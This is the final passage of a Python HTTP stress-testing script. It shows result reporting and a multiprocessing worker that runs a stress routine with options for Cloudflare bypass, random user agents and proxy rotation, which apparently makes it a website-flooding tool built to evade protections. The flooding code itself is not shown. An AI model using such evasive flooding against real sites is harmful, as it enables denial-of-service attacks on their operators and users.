    print(f"  Requests/sec:  {rps:,.2f}")
    if total_recv:
        print(f"  Throughput:    {total_recv/1024/1024:.2f} MB/s")
    if total_ok > 0:
        avg_lat = total_lat / total_ok
        print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
        print(f"  Min latency:   {lat_min*1000:.2f}ms")
        print(f"  Max latency:   {lat_max*1000:.2f}ms")
        print(f"  Status codes:  {dict(sorted(all_sc.items()))}")
    if all_errors:
        print(f"  Errors:        {dict(sorted(all_errors.items()))}")
    print(f"{'='*60}\n")


def _mp_worker(pid: int, url: str, duration: int, connections: int,
               timeout: float, cf_bypass: bool, rand_ua: bool,
               proxy_list: List[str], result_queue: mp.Queue,
               http2: bool = False) -> None:
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(
            stress(url, duration, connections, timeout,
                   cf_bypass, rand_ua, proxy_list, http2=http2)
        )
    except Exception as e:
        result = {'ok': 0, 'fail': 0, 'bytes': 0, 'lat_total': 0,
                  'lat_min': 0, 'lat_max': 0, 'sc': {}, 'errors': {str(e): 1},
                  'total': 0, 'rps': 0, 'elapsed': 0}
    finally:
        loop.close()
    result_queue.put(result)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)


